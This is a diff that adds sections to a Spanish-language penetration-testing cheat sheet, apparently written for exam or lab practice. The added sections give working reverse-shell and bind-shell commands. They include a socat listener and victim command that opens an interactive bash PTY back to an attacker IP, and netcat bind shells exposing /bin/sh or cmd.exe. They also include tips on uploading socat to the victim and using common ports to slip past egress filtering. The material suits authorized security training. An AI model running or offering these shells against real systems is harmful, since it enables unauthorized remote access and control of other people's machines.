@@ -49,6 +49,32 @@ export TERM=xterm
 stty rows 38 columns 116      # ajusta con 'stty -a' en otra terminal
 ```
 
+## socat — TTY totalmente interactiva (mejor que la de arriba)
+
+Si puedes subir/usar `socat` en la víctima, consigues una shell con TTY real (Ctrl+C, nano, su, etc.) sin los trucos de `stty`.
+
+```bash
+# Atacante (listener que asigna una PTY):
+socat file:`tty`,raw,echo=0 TCP-LISTEN:4443
+
+# Víctima (Linux):
+socat TCP:<IP_ATACANTE>:4443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+# Si no hay socat en la víctima, súbelo (binario estático: socat-1.7.x) por HTTP/SMB.
+```
+
+## Bind shells (cuando NO puedes recibir conexiones salientes)
+
+Si el egress de la víctima está filtrado (no te llega la reverse), haz que **ella** escuche y conéctate tú.
+
+```bash
+# Víctima escucha:
+nc -lvnp 4443 -e /bin/sh            # Linux (si nc tiene -e)
+nc -lvnp 4443 -e cmd.exe            # Windows (nc.exe subido)
+# Atacante conecta:
+nc <IP_VICTIMA> 4443
+```
+> Para reverse shells, si `4443` no te cae, prueba `443`/`80` (puertos de salida comúnmente permitidos).
+
 ## Generación de payloads con msfvenom
 
 > Recuerda: Metasploit/Meterpreter solo en 1 máquina. Un `shell_reverse_tcp` (no meterpreter) con listener nc no "gasta" Metasploit.
